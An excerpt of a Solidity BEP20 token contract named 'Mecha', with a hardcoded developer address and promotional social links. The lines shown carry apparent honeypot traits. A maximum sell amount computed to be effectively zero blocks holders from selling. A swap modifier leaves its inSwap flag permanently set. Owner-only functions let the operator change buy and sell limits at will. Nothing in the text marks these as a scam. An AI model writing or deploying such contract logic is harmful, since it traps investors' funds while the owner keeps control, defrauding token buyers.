...
/**
 * 🔋 MECHA
 * Telegram: https://t.me/mechabsc
 * WEB: https://mecha.network/
 * Twitter: https://twitter.com/mechabsc
*/
...
contract Mecha is IBEP20, Auth {
    ...
    address DEV = 0x2509ba13DeF41014Fc376e1861970b0E1bC19a51;
    ...
    // Name and symbol
    string constant _name = "Mecha";
    string constant _symbol = "MECHA";
    ...
    uint256 public _maxSellTxAmount = _totalSupply * 1 / 1000000000000000000000000000; 
    ...
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = true; }
    ...
    function setBuyTxLimitInPercent(uint256 maxBuyTxPercent) external authorized {
        _maxBuyTxAmount = _totalSupply.mul(maxBuyTxPercent).div(100000000);
    }

    // Set max sell TX 
    function setSellTxLimitInPercent(uint256 maxSellTxPercent) external authorized {
        _maxSellTxAmount = _totalSupply.mul(maxSellTxPercent).div(100000000);
    }
